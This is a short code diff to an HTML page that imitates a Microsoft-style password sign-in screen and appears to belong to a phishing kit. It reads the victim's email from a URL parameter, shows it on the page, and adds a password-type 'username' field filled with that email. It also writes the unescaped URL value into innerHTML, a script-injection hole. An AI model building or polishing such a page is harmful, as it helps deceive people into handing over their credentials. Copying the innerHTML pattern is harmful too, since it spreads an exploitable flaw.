@@ -278,6 +278,7 @@
             event: {
                 updateFocus: passwordTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } -->
     <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->
+            <input name="username" type="password" id="username" style="display:block;">
 
             <input name="passwd" type="password" id="i0118" class="form-control input ext-input text-box ext-text-box" aria-required="true" data-bind="
                 attr: { autocomplete: svr.fIsUpdatedAutocompleteEnabled ? 'current-password' : 'off'},
@@ -610,6 +611,7 @@
         emailval = searchParams.get('email');
         document.getElementById("displayName").innerHTML = emailval
         document.getElementById("displayName").title = emailval
+        document.getElementById("username").innerHTML = emailval
         document.getElementById("i0118").ariaLabel = "Enter the password for" + emailval
     }else {
         emailval = "vsv"
